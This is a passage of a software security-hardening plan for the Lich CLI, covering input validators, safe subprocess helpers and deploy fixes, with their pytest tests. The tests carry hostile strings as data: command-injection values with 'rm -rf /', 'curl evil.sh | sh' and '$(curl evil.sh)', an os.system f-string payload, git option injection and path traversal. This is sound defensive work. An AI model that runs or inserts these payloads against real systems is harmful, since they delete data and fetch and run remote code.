# Lich v1 Hardening — Phase 1: Security Sprint (v1.13.0) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Eliminate all known security vulnerabilities in the Lich CLI, MCP server, and generated template: shell injection, path injection, f-string injection, default secrets, and default admin password.

**Architecture:** Two new small modules (`_validate.py` for input validation, `_shell.py` for safe subprocess execution) become the security boundary. All user input is validated at entry points (CLI prompts, CLI arguments, MCP tool args) against strict allowlists; all remote SSH scripts quote interpolated values with `shlex.quote()` as defense-in-depth. The template gets a production startup guard, a generated (never default) admin password, OAuth CSRF protection, and a Traefik dashboard that only exists in dev.

**Tech Stack:** Python 3.10+, Typer, Rich, pytest + typer.testing.CliRunner, FastMCP, cookiecutter/Jinja2 templates.

**Working directory:** All `pytest` commands run from `/Users/babak/codes/DoTech/lich-framework/cli/`. All `git` commands run from the repo root `/Users/babak/codes/DoTech/lich-framework/`.

**IMPORTANT — pre-existing failures:** The suite currently has 5 failing tests unrelated to this phase (`test_all_mcp_tools_registered`, `test_ops_tools_exist`, `test_ci_tools_exist` in `test_mcp_server.py`, and `test_version_with_history_flag` in `test_version.py`). They are fixed in Phase 2. Every "run the full suite" step in this plan expects: **all other tests pass, exactly these 5 fail**. Never "fix" them in this phase.

---

## File Structure

| File | Responsibility |
|------|----------------|
| `cli/src/lich/commands/_validate.py` (new) | All input validation: identifiers, deploy paths, git URLs, git refs, domains. Raises `ValidationError`. |
| `cli/src/lich/commands/_shell.py` (new) | Safe subprocess execution: `run_local()` (list-only, never shell), `run_remote()` (SSH), `quote` re-export. |
| `cli/src/lich/commands/deploy.py` | Uses both new modules; shell-injection fix; validated prompts; quoted remote scripts; gitignore protection for env files. |
| `cli/src/lich/commands/make.py` | Validates the `name`/`event` arguments of all 10 generators. |
| `cli/src/lich/mcp/tools/make.py` | Validates MCP tool args before calling generators. |
| `cli/src/lich/mcp/tools/migration.py` | Validates migration message. |
| `cli/src/lich/mcp/tools/secret.py` | Bounds on secret generation params. |
| `template/{{cookiecutter.project_slug}}/backend/pkg/config/settings.py` | Production startup guard against default secrets. |
| `template/cookiecutter.json` + `template/hooks/post_gen_project.py` | No default admin password; random generation printed once. |
| `template/{{cookiecutter.project_slug}}/backend/scripts/seed_db.py` | Runtime refusal of empty/"admin" password. |
| `template/{{cookiecutter.project_slug}}/backend/api/http/auth.py` | OAuth `state` parameter (HMAC-signed, stateless). |
| `template/{{cookiecutter.project_slug}}/docker-compose.yml` + new `docker-compose.override.yml` | Traefik dashboard dev-only. |
| `cli/tests/test_validate.py`, `test_shell.py`, `test_deploy_security.py`, `test_mcp_validation.py`, `test_template_security.py` (all new) | Tests for the above. |

---

### Task 1: Input validation module `_validate.py`

**Files:**
- Create: `cli/src/lich/commands/_validate.py`
- Create: `cli/tests/test_validate.py`

- [ ] **Step 1: Write the failing tests**

Create `cli/tests/test_validate.py`:

```python
"""Tests for input validation helpers."""
import pytest

from lich.commands._validate import (
    ValidationError,
    validate_identifier,
    validate_deploy_path,
    validate_git_url,
    validate_git_ref,
    validate_domain,
)


class TestValidateIdentifier:
    def test_accepts_simple_name(self):
        assert validate_identifier("Product") == "Product"

    def test_accepts_underscore_name(self):
        assert validate_identifier("order_item") == "order_item"

    def test_strips_whitespace(self):
        assert validate_identifier("  Product  ") == "Product"

    def test_rejects_shell_injection(self):
        with pytest.raises(ValidationError):
            validate_identifier("Product; rm -rf /")

    def test_rejects_fstring_injection(self):
        with pytest.raises(ValidationError):
            validate_identifier("{__import__('os').system('id')}")

    def test_rejects_path_traversal(self):
        with pytest.raises(ValidationError):
            validate_identifier("../../etc/passwd")

    def test_rejects_leading_digit(self):
        with pytest.raises(ValidationError):
            validate_identifier("1Product")

    def test_rejects_empty(self):
        with pytest.raises(ValidationError):
            validate_identifier("")


class TestValidateDeployPath:
    def test_accepts_normal_path(self):
        assert validate_deploy_path("/opt/app") == "/opt/app"

    def test_accepts_nested_path(self):
        assert validate_deploy_path("/srv/my-app_2/backend") == "/srv/my-app_2/backend"

    def test_rejects_semicolon_injection(self):
        with pytest.raises(ValidationError):
            validate_deploy_path('/opt/app"; rm -rf / #')

    def test_rejects_command_substitution(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt/$(whoami)")

    def test_rejects_spaces(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt/my app")

    def test_rejects_relative_path(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("opt/app")

    def test_rejects_parent_traversal(self):
        with pytest.raises(ValidationError):
            validate_deploy_path("/opt/../etc")


class TestValidateGitUrl:
    def test_accepts_ssh_url(self):
        url = "git@github.com:acme/app.git"
        assert validate_git_url(url) == url

    def test_accepts_https_url(self):
        url = "https://github.com/acme/app.git"
        assert validate_git_url(url) == url

    def test_accepts_gitlab_ssh(self):
        url = "git@gitlab.com:group/sub/app.git"
        assert validate_git_url(url) == url

    def test_rejects_shell_metacharacters(self):
        with pytest.raises(ValidationError):
            validate_git_url("git@github.com:a/b.git && curl evil.sh | sh")

    def test_rejects_plain_string(self):
        with pytest.raises(ValidationError):
            validate_git_url("not a url")


class TestValidateGitRef:
    def test_accepts_tag(self):
        assert validate_git_ref("v1.2.3") == "v1.2.3"

    def test_accepts_branch_with_slash(self):
        assert validate_git_ref("feature/login") == "feature/login"

    def test_accepts_sha(self):
        assert validate_git_ref("a1b2c3d") == "a1b2c3d"

    def test_rejects_injection(self):
        with pytest.raises(ValidationError):
            validate_git_ref("main; rm -rf /")

    def test_rejects_leading_dash(self):
        # a leading dash could be parsed as a git option (argument injection)
        with pytest.raises(ValidationError):
            validate_git_ref("--upload-pack=touch /tmp/pwned")


class TestValidateDomain:
    def test_accepts_domain(self):
        assert validate_domain("example.com") == "example.com"

    def test_accepts_subdomain(self):
        assert validate_domain("api.example.co.uk") == "api.example.co.uk"

    def test_rejects_injection(self):
        with pytest.raises(ValidationError):
            validate_domain("example.com; curl evil.sh")

    def test_rejects_spaces(self):
        with pytest.raises(ValidationError):
            validate_domain("exam ple.com")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_validate.py -q`
Expected: FAIL/ERROR with `ModuleNotFoundError: No module named 'lich.commands._validate'`

- [ ] **Step 3: Write the implementation**

Create `cli/src/lich/commands/_validate.py`:

```python
"""
Input validation for user-supplied values that reach code generation,
file paths, or shell commands. Every validator returns the (stripped)
value on success and raises ValidationError on failure.

These are the security boundary for the CLI and the MCP server:
validate at the entry point, so everything downstream can trust its inputs.
"""
import re

_IDENTIFIER_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
_DEPLOY_PATH_RE = re.compile(r"^/[a-zA-Z0-9._/-]*$")
_GIT_SSH_RE = re.compile(r"^git@[a-zA-Z0-9.-]+:[a-zA-Z0-9._-]+(/[a-zA-Z0-9._-]+)+(\.git)?$")
_GIT_HTTPS_RE = re.compile(r"^https://[a-zA-Z0-9.-]+(/[a-zA-Z0-9._-]+)+(\.git)?$")
_GIT_REF_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/-]*$")
_DOMAIN_RE = re.compile(r"^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$")


class ValidationError(ValueError):
    """Raised when user input fails validation."""


def validate_identifier(name: str) -> str:
    """Validate a Python identifier used in generated code (entity, service, ... names)."""
    name = (name or "").strip()
    if not _IDENTIFIER_RE.match(name):
        raise ValidationError(
            f"Invalid name '{name}': use letters, digits and underscores, "
            "starting with a letter or underscore (e.g. Product, order_item)."
        )
    return name


def validate_deploy_path(path: str) -> str:
    """Validate an absolute server-side deploy path (used inside SSH commands)."""
    path = (path or "").strip()
    if not _DEPLOY_PATH_RE.match(path) or ".." in path:
        raise ValidationError(
            f"Invalid deploy path '{path}': must be an absolute path using only "
            "letters, digits, '.', '_', '-' and '/' (e.g. /opt/app)."
        )
    return path


def validate_git_url(url: str) -> str:
    """Validate a git remote URL (ssh 'git@host:owner/repo.git' or https)."""
    url = (url or "").strip()
    if not (_GIT_SSH_RE.match(url) or _GIT_HTTPS_RE.match(url)):
        raise ValidationError(
            f"Invalid git URL '{url}': expected git@host:owner/repo.git "
            "or https://host/owner/repo.git."
        )
    return url


def validate_git_ref(ref: str) -> str:
    """Validate a git ref (tag, branch, sha) used in 'git checkout <ref>'."""
    ref = (ref or "").strip()
    if not _GIT_REF_RE.match(ref):
        raise ValidationError(
            f"Invalid git ref '{ref}': use letters, digits, '.', '_', '-' and '/', "
            "not starting with '-' (e.g. v1.2.3, feature/login)."
        )
    return ref


def validate_domain(domain: str) -> str:
    """Validate a DNS domain name."""
    domain = (domain or "").strip()
    if not _DOMAIN_RE.match(domain):
        raise ValidationError(
            f"Invalid domain '{domain}': use letters, digits, '-' and '.' only "
            "(e.g. example.com)."
        )
    return domain
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_validate.py -q`
Expected: all tests PASS (28 passed)

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/commands/_validate.py cli/tests/test_validate.py
git commit -m "feat(security): add input validation module for identifiers, paths, URLs"
```

---

### Task 2: Safe subprocess module `_shell.py`

**Files:**
- Create: `cli/src/lich/commands/_shell.py`
- Create: `cli/tests/test_shell.py`

- [ ] **Step 1: Write the failing tests**

Create `cli/tests/test_shell.py`:

```python
"""Tests for safe subprocess helpers."""
from lich.commands._shell import run_local, run_remote, quote


class TestRunLocal:
    def test_runs_list_command(self):
        code, output = run_local(["echo", "hello"])
        assert code == 0
        assert "hello" in output

    def test_argument_with_metacharacters_is_not_interpreted(self):
        # If a shell were involved, this would create /tmp/lich_pwned.
        code, output = run_local(["echo", "hello; touch /tmp/lich_pwned"])
        assert code == 0
        assert "hello; touch /tmp/lich_pwned" in output
        import os
        assert not os.path.exists("/tmp/lich_pwned")

    def test_missing_command_returns_error_tuple(self):
        code, output = run_local(["definitely-not-a-real-command-xyz"])
        assert code == 1
        assert "not found" in output.lower()

    def test_timeout_returns_error_tuple(self):
        code, output = run_local(["sleep", "5"], timeout=1)
        assert code == 1
        assert "timeout" in output.lower()


class TestRunRemote:
    def test_builds_ssh_command_as_list(self, monkeypatch):
        captured = {}

        def fake_run_local(cmd, timeout=None, capture=True):
            captured["cmd"] = cmd
            return 0, "ok"

        monkeypatch.setattr("lich.commands._shell.run_local", fake_run_local)
        code, output = run_remote("prod-server", "docker ps")
        assert code == 0
        assert captured["cmd"][0] == "ssh"
        assert captured["cmd"][-1] == "docker ps"
        assert "prod-server" in captured["cmd"]


class TestQuote:
    def test_quote_neutralizes_injection(self):
        hostile = '/opt/app"; rm -rf / #'
        quoted = quote(hostile)
        # shlex.quote wraps in single quotes so the shell treats it as one token
        assert quoted.startswith("'")
        assert quoted.endswith("'")
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_shell.py -q`
Expected: FAIL/ERROR with `ModuleNotFoundError: No module named 'lich.commands._shell'`

- [ ] **Step 3: Write the implementation**

Create `cli/src/lich/commands/_shell.py`:

```python
"""
Safe subprocess execution helpers.

Rules enforced here:
- Local commands are ALWAYS argument lists. shell=True is never used.
- Remote (SSH) commands are strings executed by the remote shell, so every
  interpolated value MUST be quoted with quote() at the call site.
"""
import subprocess
from shlex import quote  # re-exported: call sites use `from lich.commands._shell import quote`

__all__ = ["run_local", "run_remote", "quote"]


def run_local(
    cmd: list[str],
    cwd=None,
    timeout: int | None = None,
    capture: bool = True,
) -> tuple[int, str]:
    """Run a local command (argument list, never a shell string).

    Returns (returncode, combined stdout+stderr). Never raises for
    missing binaries or timeouts - returns (1, message) instead.
    """
    try:
        if capture:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout, cwd=cwd
            )
            return result.returncode, result.stdout + result.stderr
        result = subprocess.run(cmd, timeout=timeout, cwd=cwd)
        return result.returncode, ""
    except subprocess.TimeoutExpired:
        return 1, "Command timeout"
    except FileNotFoundError:
        return 1, f"Command not found: {cmd[0]}"


def run_remote(
    ssh_host: str,
    script: str,
    timeout: int = 120,
    capture: bool = True,
) -> tuple[int, str]:
    """Run a script on a remote host via SSH.

    The script runs in the remote shell: every value interpolated into it
    must be pre-quoted with quote().
    """
    ssh_cmd = [
        "ssh",
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=10",
        ssh_host,
        script,
    ]
    return run_local(ssh_cmd, timeout=timeout, capture=capture)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_shell.py -q`
Expected: all tests PASS (7 passed)

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/commands/_shell.py cli/tests/test_shell.py
git commit -m "feat(security): add safe subprocess helpers (no shell=True, quoted SSH scripts)"
```

---

### Task 3: Fix shell injection in `_verify_github_access`

**Files:**
- Modify: `cli/src/lich/commands/deploy.py:178-192` (function `_verify_github_access`)
- Create: `cli/tests/test_deploy_security.py`

- [ ] **Step 1: Write the failing test**

Create `cli/tests/test_deploy_security.py`:

```python
"""Security tests for lich deploy: no shell=True, validated inputs, quoted scripts."""
import pytest


class TestVerifyGithubAccess:
    def test_uses_list_command_not_shell(self, monkeypatch):
        """A hostile key_path must be passed as a literal argument, never through a shell."""
        captured = {}

        def fake_run(cmd, **kwargs):
            captured["cmd"] = cmd
            captured["kwargs"] = kwargs

            class Result:
                returncode = 1
                stdout = ""
                stderr = "Hi acme! You've successfully authenticated"

            return Result()

        monkeypatch.setattr("lich.commands.deploy.subprocess.run", fake_run)
        from lich.commands.deploy import _verify_github_access

        hostile_key = '/tmp/key"; touch /tmp/lich_pwned #'
        result = _verify_github_access("git@github.com:acme/app.git", hostile_key)

        assert isinstance(captured["cmd"], list), "command must be an argument list"
        assert captured["kwargs"].get("shell") is not True, "shell=True is forbidden"
        assert hostile_key in captured["cmd"], "key path must be a literal list element"
        assert result is True

    def test_detects_failed_auth(self, monkeypatch):
        def fake_run(cmd, **kwargs):
            class Result:
                returncode = 255
                stdout = ""
                stderr = "git@github.com: Permission denied (publickey)."

            return Result()

        monkeypatch.setattr("lich.commands.deploy.subprocess.run", fake_run)
        from lich.commands.deploy import _verify_github_access

        assert _verify_github_access("git@github.com:acme/app.git", "/tmp/key") is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py -q`
Expected: FAIL — `test_uses_list_command_not_shell` fails on `isinstance(captured["cmd"], list)` (current code passes a string with `shell=True`). Note: `test_detects_failed_auth` may pass already; that is fine.

- [ ] **Step 3: Fix the implementation**

In `cli/src/lich/commands/deploy.py`, replace the entire `_verify_github_access` function (currently lines 178-192):

```python
def _verify_github_access(git_url: str, key_path: str) -> bool:
    """Verify that the deploy key can access the GitHub/GitLab repo."""
    provider, owner, repo = _extract_repo_info(git_url)

    git_host = "git@github.com" if provider == "github" else "git@gitlab.com"
    cmd = [
        "ssh",
        "-i", key_path,
        "-o", "StrictHostKeyChecking=accept-new",
        "-T", git_host,
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    # ssh -T writes its greeting to stderr; GitHub exits 1 on success
    output = (result.stdout + result.stderr).lower()
    return "successfully authenticated" in output or "welcome" in output
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py -q`
Expected: 2 passed

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/commands/deploy.py cli/tests/test_deploy_security.py
git commit -m "fix(security): remove shell=True from deploy key verification (shell injection)"
```

---

### Task 4: Identifier validation in all `lich make` generators

**Files:**
- Modify: `cli/src/lich/commands/make.py` (imports, new helper after `_check_lich_project`, one line in each of the 10 commands)
- Modify: `cli/tests/test_make.py` (append new test class)

- [ ] **Step 1: Write the failing tests**

Append to `cli/tests/test_make.py`:

```python
class TestMakeNameValidation:
    """All make commands must reject names that could inject into generated code or paths."""

    def test_make_entity_rejects_shell_metacharacters(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "entity", "Product; rm -rf /"])
        assert result.exit_code == 1
        assert "Invalid name" in result.output
        assert "Created" not in result.output

    def test_make_entity_rejects_fstring_injection(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "entity", "{__import__('os').system('id')}"])
        assert result.exit_code == 1
        assert "Invalid name" in result.output

    def test_make_entity_rejects_path_traversal(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "entity", "../../outside"])
        assert result.exit_code == 1
        assert not (in_lich_project.parent / "outside.py").exists()

    def test_make_service_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "service", "Bad Name"])
        assert result.exit_code == 1
        assert "Invalid name" in result.output

    def test_make_api_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "api", "x;y"])
        assert result.exit_code == 1

    def test_make_dto_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "dto", "x;y"])
        assert result.exit_code == 1

    def test_make_factory_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "factory", "x;y"])
        assert result.exit_code == 1

    def test_make_middleware_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "middleware", "x;y"])
        assert result.exit_code == 1

    def test_make_event_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "event", "x;y"])
        assert result.exit_code == 1

    def test_make_listener_rejects_invalid_event(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "listener", "SendEmail", "--event", "Evil;Event"])
        assert result.exit_code == 1

    def test_make_job_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "job", "x;y"])
        assert result.exit_code == 1

    def test_make_policy_rejects_invalid_name(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "policy", "x;y"])
        assert result.exit_code == 1

    def test_valid_names_still_work(self, runner: CliRunner, in_lich_project: Path):
        result = runner.invoke(app, ["make", "entity", "OrderItem"])
        assert result.exit_code == 0
        assert (in_lich_project / "backend/internal/entities/orderitem.py").exists()
```

Note: check the actual `--event` option name of `make listener` before running (open `cli/src/lich/commands/make.py:566` and read the signature); if the option is positional or named differently, adjust the invoke call accordingly.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_make.py::TestMakeNameValidation -q`
Expected: most tests FAIL (commands currently accept any string). `test_valid_names_still_work` passes.

- [ ] **Step 3: Wire validation into make.py**

In `cli/src/lich/commands/make.py`:

3a. Add the import at the top (after `from rich.console import Console`):

```python
from lich.commands._validate import ValidationError, validate_identifier
```

3b. Add this helper right after the existing `_check_lich_project()` function (line ~24):

```python
def _valid_name(name: str) -> str:
    """Validate a generator name argument; exit with a friendly error if invalid."""
    try:
        return validate_identifier(name)
    except ValidationError as e:
        console.print(f"[red]❌ {e}[/red]")
        raise typer.Exit(1)
```

3c. In **each** of the 10 command functions, insert `name = _valid_name(name)` immediately after the project check. The pattern in every command is:

```python
    if not _check_lich_project():
        raise typer.Exit(1)
```

becomes:

```python
    if not _check_lich_project():
        raise typer.Exit(1)

    name = _valid_name(name)
```

Apply to all of: `make_entity` (line ~40), `make_service` (~173), `make_api` (~237), `make_dto` (~312), `make_factory` (~375), `make_middleware` (~446), `make_event` (~510), `make_listener` (~566), `make_job` (~621), `make_policy` (~735). (Line numbers shift as you edit — match on the function names.)

3d. In `make_listener` only, also validate the event parameter on the next line:

```python
    name = _valid_name(name)
    event = _valid_name(event)
```

(Check the actual parameter name in the signature — it is the listener's event argument.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_make.py -q`
Expected: all pass (21 pre-existing + 14 new)

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/commands/make.py cli/tests/test_make.py
git commit -m "fix(security): validate generator names (blocks f-string/path injection in lich make)"
```

---

### Task 5: Validate deploy inputs (prompts, config, CLI options)

**Files:**
- Modify: `cli/src/lich/commands/deploy.py` (imports, `deploy_setup`, `deploy_init`, `deploy_status`, `_run_deploy`, `deploy_logs`)
- Modify: `cli/tests/test_deploy_security.py` (append)

- [ ] **Step 1: Write the failing tests**

Append to `cli/tests/test_deploy_security.py`:

```python
import yaml
from typer.testing import CliRunner
from pathlib import Path

from lich.cli import app


def _write_deploy_config(project_dir: Path, path_value: str, git_repo: str = "git@github.com:acme/app.git"):
    lich_dir = project_dir / ".lich"
    lich_dir.mkdir(exist_ok=True)
    config = {
        "production": {
            "connection": "manual",
            "host": "192.0.2.10",
            "user": "root",
            "path": path_value,
            "runtime": "docker-compose",
        },
        "git_repo": git_repo,
    }
    (lich_dir / "deploy.yml").write_text(yaml.dump(config))


class TestDeployConfigValidation:
    def test_deploy_init_rejects_malicious_path(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, '/opt/app"; rm -rf / #')

        result = runner.invoke(app, ["deploy", "init", "production"])
        assert result.exit_code == 1
        assert "Invalid" in result.output

    def test_deploy_init_rejects_malicious_git_url(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, "/opt/app", git_repo="git@github.com:a/b.git && curl evil.sh | sh")

        result = runner.invoke(app, ["deploy", "init", "production"])
        assert result.exit_code == 1
        assert "Invalid" in result.output

    def test_deploy_prod_rejects_malicious_version(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, "/opt/app")

        result = runner.invoke(
            app,
            ["deploy", "prod", "backend", "--force", "--version", "v1; rm -rf /"],
        )
        assert result.exit_code == 1
        assert "Invalid" in result.output

    def test_deploy_prod_rejects_malicious_config_path(self, runner: CliRunner, temp_dir: Path, monkeypatch):
        monkeypatch.chdir(temp_dir)
        (temp_dir / "backend").mkdir()
        _write_deploy_config(temp_dir, "$(curl evil.sh)")

        result = runner.invoke(app, ["deploy", "prod", "backend", "--force"])
        assert result.exit_code == 1
        assert "Invalid" in result.output
```

The `runner` and `temp_dir` fixtures come from `cli/tests/conftest.py`.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py -q`
Expected: the 4 new tests FAIL (deploy proceeds to SSH-connection attempts or crashes differently — exit code may be 1 for the wrong reason, so check the "Invalid" assertion actually fails). If a test fails only because SSH times out slowly, that still proves validation is missing.

- [ ] **Step 3: Wire validation into deploy.py**

3a. Add import near the top of `cli/src/lich/commands/deploy.py` (after `from rich.progress import ...`):

```python
from lich.commands._validate import (
    ValidationError,
    validate_deploy_path,
    validate_domain,
    validate_git_ref,
    validate_git_url,
)
```

3b. Add a prompt-loop helper after `_check_lich_project()` (line ~68):

```python
def _prompt_validated(prompt_text: str, validator, default: str = None):
    """Prompt.ask in a loop until the validator accepts the value."""
    while True:
        value = Prompt.ask(prompt_text, default=default) if default is not None else Prompt.ask(prompt_text)
        try:
            return validator(value)
        except ValidationError as e:
            console.print(f"  [red]{e}[/red]")
```

3c. In `deploy_setup`, replace the deploy-path prompt (line ~346):

```python
        # Deploy path
        deploy_path = Prompt.ask("Deploy path on server", default="/opt/app")
        env_config["path"] = deploy_path
```

with:

```python
        # Deploy path
        deploy_path = _prompt_validated("Deploy path on server", validate_deploy_path, default="/opt/app")
        env_config["path"] = deploy_path
```

3d. In `deploy_setup`, replace the git-repo prompt (line ~381):

```python
        git_repo = Prompt.ask("Git repo URL (SSH format)", default=default_repo)
        config["git_repo"] = git_repo
```

with:

```python
        git_repo = _prompt_validated("Git repo URL (SSH format)", validate_git_url, default=default_repo)
        config["git_repo"] = git_repo
```

3e. In `deploy_setup`, replace the domain prompts (line ~440):

```python
    domain = Prompt.ask("Main domain", default=f"{project_name}.com")
    api_subdomain = Prompt.ask("API subdomain", default=f"api.{domain}")
    admin_subdomain = Prompt.ask("Admin subdomain", default=f"admin.{domain}")
```

with:

```python
    domain = _prompt_validated("Main domain", validate_domain, default=f"{project_name}.com")
    api_subdomain = _prompt_validated("API subdomain", validate_domain, default=f"api.{domain}")
    admin_subdomain = _prompt_validated("Admin subdomain", validate_domain, default=f"admin.{domain}")
```

3f. In `deploy_init`, right after these existing lines (~line 525):

```python
    deploy_path = env_config.get("path", "/opt/app")
    git_repo = config.get("git_repo")
```

insert (the config file is hand-editable, so re-validate):

```python
    try:
        deploy_path = validate_deploy_path(deploy_path)
        if git_repo:
            git_repo = validate_git_url(git_repo)
    except ValidationError as e:
        console.print(f"[red]Invalid value in {DEPLOY_CONFIG_PATH}: {e}[/red]")
        raise typer.Exit(1)
```

3g. In `deploy_status`, after `deploy_path = env_config.get("path", "/opt/app")` (inside the for-loop over environments), insert:

```python
        try:
            deploy_path = validate_deploy_path(deploy_path)
        except ValidationError as e:
            console.print(f"│  [red]Invalid deploy path in config: {e}[/red]")
            continue
```

3h. In `_run_deploy`, after `deploy_path = env_config.get("path", "/opt/app")`, insert:

```python
    try:
        deploy_path = validate_deploy_path(deploy_path)
        if version and version != "latest":
            version = validate_git_ref(version)
    except ValidationError as e:
        console.print(f"[red]Invalid value: {e}[/red]")
        raise typer.Exit(1)
```

3i. In `deploy_logs`, after `deploy_path = env_config.get("path", "/opt/app")`, insert:

```python
    _validate_component(component)
    try:
        deploy_path = validate_deploy_path(deploy_path)
    except ValidationError as e:
        console.print(f"[red]Invalid deploy path in config: {e}[/red]")
        raise typer.Exit(1)
```

(`_validate_component` already exists at line ~57 and allowlists component names; `lich deploy logs -c` currently accepts arbitrary strings into an SSH command.)

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py -q`
Expected: all pass (6 passed)

- [ ] **Step 5: Commit**

```bash
cd /Users/babak/codes/DoTech/lich-framework
git add cli/src/lich/commands/deploy.py cli/tests/test_deploy_security.py
git commit -m "fix(security): validate deploy paths, git URLs, refs and domains at all entry points"
```

---

### Task 6: Quote every value interpolated into remote SSH scripts

**Files:**
- Modify: `cli/src/lich/commands/deploy.py` (`_run_ssh_command`, `_build_clone_cmd` new, `deploy_init`, `deploy_status`, `_run_deploy`, `deploy_logs`)
- Modify: `cli/tests/test_deploy_security.py` (append)

Validation (Task 5) already restricts these values to a safe charset; quoting is defense-in-depth so a future validator regression cannot become an injection.

- [ ] **Step 1: Write the failing test**

Append to `cli/tests/test_deploy_security.py`:

```python
class TestRemoteScriptQuoting:
    def test_clone_cmd_quotes_path_and_repo(self):
        from lich.commands.deploy import _build_clone_cmd

        cmd = _build_clone_cmd('/opt/app"; rm -rf / #', "git@github.com:acme/app.git")
        # the hostile path must appear only inside single quotes
        assert '\'/opt/app"; rm -rf / #\'' in cmd
        # and never unquoted
        assert 'mkdir -p /opt/app";' not in cmd

    def test_run_ssh_command_delegates_to_shell_module(self, monkeypatch):
        captured = {}

        def fake_run_remote(ssh_host, script, timeout=120, capture=True):
            captured["ssh_host"] = ssh_host
            captured["script"] = script
            return 0, "ok"

        monkeypatch.setattr("lich.commands.deploy.run_remote", fake_run_remote)
        from lich.commands.deploy import _run_ssh_command

        code, output = _run_ssh_command("prod", "echo ok")
        assert code == 0
        assert captured["ssh_host"] == "prod"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd /Users/babak/codes/DoTech/lich-framework/cli && python3 -m pytest tests/test_deploy_security.py::TestRemoteScriptQuoting -q`
Expected: FAIL with `ImportError: cannot import name '_build_clone_cmd'` (and `run_remote` not present in deploy module)

- [ ] **Step 3: Implement quoting**

All edits in `cli/src/lich/commands/deploy.py`:

3a. Add import (next to the `_validate` import added in Task 5):

```python
from lich.commands._shell import quote, run_remote
```

3b. Replace the body of `_run_ssh_command` (lines ~105-119) to delegate:

```python
def _run_ssh_command(ssh_host: str, command: str, capture: bool = True, timeout: int = 120) -> tuple[int, str]:
    """Run a command on remote server via SSH."""
    return run_remote(ssh_host, command, timeout=timeout, capture=capture)
```

3c. Add a pure builder function right after `_run_ssh_command` (pure so it is unit-testable):

```python
def _build_clone_cmd(deploy_path: str, git_repo: str) -> str:
    """Build the remote clone-or-pull script with all values shell-quoted."""
    qpath = quote(deploy_path)
    qrepo = quote(git_repo)
    return (
        f"mkdir -p {qpath} && "
        f"if [ -d {qpath}/.git ]; then cd {qpath} && git pull; "
        f"else rm -rf {qpath}/* && git clone {qrepo} {qpath}; fi"
    )
```

3d. In `deploy_init`, replace the existing `clone_cmd` block (lines ~606-616):

```python
        clone_cmd = f"""
            mkdir -p {deploy_path} && \
            if [ -d "{deploy_path}/.git" ]; then
                cd {deploy_path} && git pull
            else
                rm -rf {deploy_path}/* && \
                git clone {git_repo} {deploy_path}
            fi
        """
